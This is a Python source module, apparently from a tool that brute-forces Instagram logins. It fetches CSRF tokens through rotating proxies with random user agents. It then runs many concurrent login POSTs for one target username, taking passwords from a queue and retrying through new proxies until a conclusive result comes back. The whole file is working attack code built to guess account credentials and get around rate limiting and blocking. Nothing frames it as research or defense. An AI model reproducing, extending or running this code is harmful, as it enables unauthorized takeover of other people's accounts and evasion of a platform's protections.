from __future__ import absolute_import

import asyncio
import aiohttp

import random

from app import settings
from app.lib import exceptions
from app.lib.utils import get_token_from_response, cancel_remaining_tasks
from app.lib.logging import AppLogger, log_attempt_context, log_token_context
from app.lib.models import InstagramResult, LoginAttemptContext, LoginContext, TokenContext


log = AppLogger(__file__)


class HandlerSettings(object):

    # TODO
    # ATTEMPT_LIMIT = settings.REQUESTS.ATTEMPT_LIMIT.login

    @property
    def FIRST_ATTEMPT_LIMIT(self):
        return settings.REQUESTS.value(
            'FIRST_ATTEMPT_LIMIT', self.__handlername__)

    @property
    def CONNECTOR_KEEP_ALIVE_TIMEOUT(self):
        return settings.REQUESTS.value(
            'CONNECTOR_KEEP_ALIVE_TIMEOUT', self.__handlername__)

    @property
    def FETCH_TIME(self):
        return settings.REQUESTS.value(
            'FETCH_TIME', self.__handlername__)

    @property
    def MAX_REQUEST_RETRY_LIMIT(self):
        return settings.REQUESTS.value(
            'MAX_REQUEST_RETRY_LIMIT', self.__handlername__)


class request_handler(HandlerSettings):

    def __init__(self, config, global_stop_event, proxy_handler):
        self.config = config
        self.global_stop_event = global_stop_event
        self.user_agent = random.choice(settings.USER_AGENTS)
        self.stop_event = asyncio.Event()
        self.proxy_handler = proxy_handler

    def _headers(self):
        headers = settings.HEADER.copy()
        headers['user-agent'] = self.user_agent
        return headers

    @property
    def connector(self):
        """
        TCPConnector
        -------------
        keepalive_timeout (float) – timeout for connection reusing after
            releasing
        limit_per_host (int) – limit simultaneous connections to the same
            endpoint (default is 0)
        """
        return aiohttp.TCPConnector(
            ssl=False,
            limit=100,  # The Default
            keepalive_timeout=self.CONNECTOR_KEEP_ALIVE_TIMEOUT,
            enable_cleanup_closed=True,
        )

    @property
    def timeout(self):
        return aiohttp.ClientTimeout(
            total=self.FETCH_TIME
        )

    def log_request(self, context, log, retry=1, method="GET"):
        if retry == 1:
            log.info(
                f'Sending {method.upper()} Request',
                extra={'context': context}
                # extra={'context.log_context(backstep=3)'},
            )
        else:
            log.info(
                f'Sending {method.upper()} Request, Attempt {retry}',
                extra={'context': context}
                # extra=context.log_context(backstep=3),
            )

    def log_post_request(self, context, log, retry=1):
        self.log_request(context, log, retry=1, method='POST')

    def log_get_request(self, context, log, retry=1):
        self.log_request(context, log, retry=1, method='GET')


class token_handler(request_handler):

    __handlername__ = 'token'

    def _get_token_from_response(self, response):
        token = get_token_from_response(response)
        if not token:
            raise exceptions.TokenNotInResponse()
        return token

    @log_token_context
    async def request(self, session, context, retry=1):
        log = AppLogger('Token Fetch')

        self.log_get_request(context, log, retry=retry)

        try:
            async with session.get(
                settings.INSTAGRAM_URL,
                raise_for_status=True,
                headers=self._headers(),
                timeout=self.FETCH_TIME,
                proxy=context.proxy.url(scheme='http')
            ) as response:
                # Raise for status is automatically performed, so we do not have
                # to have a client response handler.
                try:
                    token = self._get_token_from_response(response)
                except exceptions.TokenNotInResponse as e:
                    log.warning(e)
                    return None
                else:
                    log.notice('Got Token')
                    await self.proxy_handler.good.put(context.proxy)
                    return token

        except (aiohttp.ClientProxyConnectionError, aiohttp.ServerTimeoutError) as e:
            log.warning(e)

            # We probably want to lower this number
            if retry < self.MAX_REQUEST_RETRY_LIMIT:
                # Session should still be alive.
                await asyncio.sleep(1)
                retry += 1
                return await self.request(session, context, retry=retry)
            else:
                log.error(e)
                return None

        except aiohttp.ClientError as e:
            log.error(e)
            return None

        except asyncio.CancelledError:
            return None

        except (TimeoutError, asyncio.TimeoutError) as e:
            log.error('TimeoutError')
        except Exception as e:
            raise exceptions.FatalException(f'Uncaught Exception: {str(e)}')

    async def fetch(self):
        """
        Asyncio Docs:

        asyncio.as_completed

            Run awaitable objects in the aws set concurrently. Return an iterator
            of Future objects. Each Future object returned represents the earliest
            result from the set of the remaining awaitables.

            Raises asyncio.TimeoutError if the timeout occurs before all Futures are done.
        """
        context = None
        tasks = []

        async with aiohttp.ClientSession(
            connector=self.connector,
            timeout=self.timeout
        ) as session:
            while not self.global_stop_event.is_set():
                if context and context.index > self.FIRST_ATTEMPT_LIMIT:
                    break

                proxy = await self.proxy_handler.get_best()

                # Starts Index at 0
                if not context:
                    context = TokenContext(proxy=proxy)
                else:
                    # Increments Index and Uses New Proxy
                    context = context.new(proxy)

                if context.index > self.FIRST_ATTEMPT_LIMIT:
                    break

                log.info("Fetching Token")
                task = asyncio.ensure_future(self.request(session, context))
                tasks.append(task)

            # TODO: Incorporate some type of timeout as an edge cases if None of the
            # futures are finishing.
            for future in asyncio.as_completed(tasks, timeout=None):
                earliest_future = await future
                if earliest_future:
                    await cancel_remaining_tasks(tasks)
                    return earliest_future


class login_handler(request_handler):

    __handlername__ = 'login'

    def __init__(self, config, global_stop_event, proxy_handler):
        super(login_handler, self).__init__(config, global_stop_event, proxy_handler)
        self.user = self.config.user

    def _login_data(self, password):
        return {
            settings.INSTAGRAM_USERNAME_FIELD: self.user.username,
            settings.INSTAGRAM_PASSWORD_FIELD: password
        }

    def _headers(self, token):
        headers = super(login_handler, self)._headers()
        headers[settings.TOKEN_HEADER] = token
        return headers

    async def _get_result_from_response(self, response, context):
        try:
            result = await response.json()
        except ValueError:
            raise exceptions.ResultNotInResponse()
        else:
            return InstagramResult.from_dict(result, context)

    @log_attempt_context
    async def _handle_client_response(self, response, context):
        """
        Takes the AIOHttp ClientResponse and tries to return a parsed
        InstagramResult object.

        For AIOHttp sessions and client responses, we cannot read the json
        after response.raise_for_status() has been called.

        Since a 400 response will have valid json that can indicate an authentication,
        via a `checkpoint_required` value, we cannot raise_for_status until after
        we try to first get the response json.
        """
        log = AppLogger('Handling Client Response')

        if response.status >= 400 and response.status < 500:
            log.debug('Response Status Code : %s' % response.status)
            if response.status == 400:
                return await self._get_result_from_response(response, context)
            else:
                response.raise_for_status()
        else:
            try:
                log.debug('Creating Result from Response')
                return await self._get_result_from_response(response, context)
            except exceptions.ResultNotInResponse as e:
                raise exceptions.FatalException(
                    "Unexpected behavior, result should be in response."
                )

    async def _handle_parsed_result(self, result, context):
        """
        Raises an exception if the result that was in the response is either
        non-conclusive or has an error in it.

        If the result does not have an error and is non conslusive, than we
        can assume that the proxy was most likely good.
        """
        if result.has_error:
            raise exceptions.InstagramResultError(result.error_message)
        else:
            if not result.conclusive:
                raise exceptions.InstagramResultError("Inconslusive result.")
            return result

    @log_attempt_context
    async def request(self, session, context, retry=1):
        """
        Do not want to automatically raise for status because we can have
        a 400 error but enough info in response to authenticate.

        Also, once response.raise_for_status() is called, we cannot access
        the response.json().
        """
        # Autologger not working because of keyword argument
        log = AppLogger('Login Request')
        self.log_post_request(context, log, retry=retry)

        try:
            log.debug('Attempting Request')
            async with session.post(
                settings.INSTAGRAM_LOGIN_URL,
                headers=self._headers(context.token),
                data=self._login_data(context.password),
                timeout=self.FETCH_TIME,
                proxy=context.proxy.url(scheme='http')
            ) as response:
                # Only reason to log these errors here is to provide the response
                # object
                try:
                    log.debug('Handling Client Response')
                    result = await self._handle_client_response(response, context)
                    result = await self._handle_parsed_result(result, context)

                except exceptions.ResultNotInResponse as e:
                    log.error(e, extra={'response': response})

                except exceptions.InstagramResultError as e:
                    log.error(e, extra={'response': response})

                else:
                    if not result:
                        raise exceptions.FatalException("Result should not be None here.")

                    log.debug('Putting Proxy in Good Queue')
                    self.proxy_handler.good.put_nowait(context.proxy)
                    return result

        except (aiohttp.ClientProxyConnectionError, aiohttp.ServerTimeoutError) as e:
            retry += 1

            # We probably want to lower this number
            if retry < self.MAX_REQUEST_RETRY_LIMIT:
                # Session should still be alive.
                log.info('Connection Error... Sleeping')
                await asyncio.sleep(1)
                log.info('Connection Error... Retrying')
                return await self.request(session, context, retry=retry)
            else:
                log.error(e, extra=context.log_context())
                return None

        except OSError as e:
            # We have only seen this for the following:
            # OSError: [Errno 24] Too many open files
            # But for now it's safer to just sleep on the general exception than
            # check for the exception code explicitly.

            # TODO: Make sure that this isn't also a connection reset by peer
            # exception, in which case we might want to not sleep but instead
            # just return and move onto next proxy.
            log.error(str(e), extra=context.log_context())
            log.warning('Sleeping for %s Seconds...' % 5)
            await asyncio.sleep(5)
            return await self.request(session, context, retry=retry)

        except asyncio.TimeoutError as e:
            log.error('TimeoutError')
        except aiohttp.ClientError as e:
            log.error(e)
        except Exception as e:
            raise exceptions.FatalException(f'Uncaught Exception: {str(e)}')

    @log_attempt_context
    async def attempt_login(self, session, context, results):
        """
        Instead of doing these one after another, we might be able to stagger
        them asynchronously.  This would be waiting like 3 seconds in between
        tasks just in case the first one immediately doesn't work, or finding
        a faster way of accounting for bad proxies.

        Safer way for now is to do single attempts for password one after
        another.

        TODO
        -----
        Should we incorporate some type of limit here, so that we don't wind
        up trying to login with same password 100 times for safety?
        """
        log = AppLogger('Login Attempt')

        stop_event = asyncio.Event()
        index = 0

        while not self.global_stop_event.is_set() and not stop_event.is_set():

            proxy = await self.proxy_handler.get_best()
            context = LoginAttemptContext(
                index=index,
                proxy=proxy,
                password=context.password,
                token=context.token
            )
            index += 1
            log.info(context)

            log.info('Attempting Login {}...'.format(context.password))
            result = await self.request(session, context)

            if result and result.conclusive:
                log.debug('Got Conclusive Result')
                # Returning and setting stop event is kind of redundant since these
                # are running synchronously.
                stop_event.set()
                await results.put(result)
                return

            else:
                if result is None:
                    log.debug('Got Null Result')
                else:
                    log.debug('Got Inconclusive Result')

    async def consume_passwords(self, passwords, results, token):
        """
        Asyncio Docs:

        asyncio.as_completed
        -------------------
            Run awaitable objects in the aws set concurrently. Return an iterator
            of Future objects. Each Future object returned represents the earliest
            result from the set of the remaining awaitables.

            Raises asyncio.TimeoutError if the timeout occurs before all Futures are done.

        TODO
        -----
        Incorporate timeout into asyncio.as_completed() just in case of situations
        where it could get caught.
        """
        if passwords.qsize() == 0:
            log.error('No Passwords to Consume')
            return

        tasks = []
        context = None

        async with aiohttp.ClientSession(
            connector=self.connector,
            timeout=self.timeout
        ) as session:
            while not passwords.empty():
                # We might have to watch out for empty queue here.
                password = await passwords.get()
                log.debug(f'Got Password {password} from Queue')

                if not context:
                    # Starts Index at 0
                    context = LoginContext(token=token, password=password)
                else:
                    # Increments Index and Uses New Password
                    context = context.new(password)

                log.debug('Creating Login Attempt Future', extra={'context': context})
                task = asyncio.ensure_future(self.attempt_login(session, context, results))
                tasks.append(task)

            log.debug('Waiting for Attempts to Finish...')
            return await asyncio.gather(*tasks)
